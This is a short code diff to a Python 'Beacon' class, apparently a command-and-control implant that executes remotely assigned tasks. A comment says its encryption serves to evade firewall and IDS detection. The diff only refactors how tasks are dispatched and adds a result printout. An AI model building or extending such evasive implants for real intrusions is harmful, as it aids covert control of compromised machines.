@@ -13,6 +13,7 @@ from threading import Thread
 # Encryption libraries to prevent Firewall and IDS Detection
 from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
 
+from task_handler import task_manager
 
 class Beacon:
 
@@ -277,7 +278,9 @@ class Beacon:
                     print(f"Started executing {task}")
 
                     try:
-                        result = self.task_manager.execute(task)
+                        result = task_manager.execute(task)
+
+                        print(f"RESULT = {result}")
 
                         self.update_task_status(
                             task_id, status="completed", result=result
